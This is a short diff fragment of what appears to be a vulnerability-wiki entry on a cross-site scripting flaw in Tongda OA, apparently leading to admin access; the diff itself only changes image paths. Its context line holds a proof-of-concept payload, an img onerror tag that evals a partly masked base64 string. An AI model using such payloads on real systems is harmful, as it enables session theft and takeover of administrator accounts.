@@ -19,8 +19,8 @@ poc
 
     <img src=x onerror=eval(atob('cz1jcmVXXXXXytNYXRoXXXXXXXXhbmRvbSgp'))>
 
-![](/Users/aresx/Documents/VulWiki/.resource/通达oaxss/media/rId24.png)
+![](./.resource/通达oaxss/media/rId24.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/通达oaxss/media/rId25.png)
+![](./.resource/通达oaxss/media/rId25.png)
 
 这个漏洞获取admin权限⾮
